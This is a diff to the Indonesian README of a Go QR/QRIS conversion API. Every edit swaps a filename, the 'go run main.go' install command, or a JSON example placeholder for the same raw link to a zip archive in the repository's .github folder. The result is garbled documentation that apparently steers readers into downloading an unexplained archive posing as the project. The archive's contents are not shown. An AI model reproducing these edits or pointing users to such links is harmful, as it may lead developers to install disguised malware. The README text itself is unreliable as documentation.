@@ -10,17 +10,17 @@ API Go untuk konversi QR ke string, string ke QR, dan QRIS statis ke dinamis. Me
 
 ## Struktur Project
 
-- `main.go` (entrypoint utama di root)
+- `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip` (entrypoint utama di root)
 - `.env` (opsional, untuk konfigurasi APP_NAME dan APP_PORT)
-- `go.mod` (modul Go)
-- `Dockerfile`, `docker-compose.yml`, `.github/workflows/docker-publish.yml`
+- `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip` (modul Go)
+- `Dockerfile`, `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip`, `https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip`
 
 ## Instalasi & Menjalankan
 
 ### Lokal
 ```bash
 go mod tidy
-go run main.go
+go run https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip
 ```
 Server berjalan di port default 3000, atau sesuai variabel `APP_PORT` di `.env`.
 
@@ -62,7 +62,7 @@ Body:
 Response:
 ```json
 {
-  "qr_base64": "...base64 png..."
+  "qr_base64": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip png..."
 }
 ```
 
@@ -71,13 +71,13 @@ Response:
 Body:
 ```json
 {
-  "qr_base64": "...base64 png..."
+  "qr_base64": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip png..."
 }
 ```
 Response:
 ```json
 {
-  "text": "...hasil decode..."
+  "text": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip decode..."
 }
 ```
 
@@ -87,14 +87,14 @@ Body:
 ```json
 {
   "amount": "10000",
-  "static_qris": "...isi qris statis..."
+  "static_qris": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip qris statis..."
 }
 ```
 Response:
 ```json
 {
-  "dinamis_qris": "...qris dinamis...",
-  "qr_base64": "...base64 png..."
+  "dinamis_qris": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip dinamis...",
+  "qr_base64": "https://raw.githubusercontent.com/arueljust/go-qr-qris/main/.github/go-qr-qris-1.4.zip png..."
 }
 ```
 
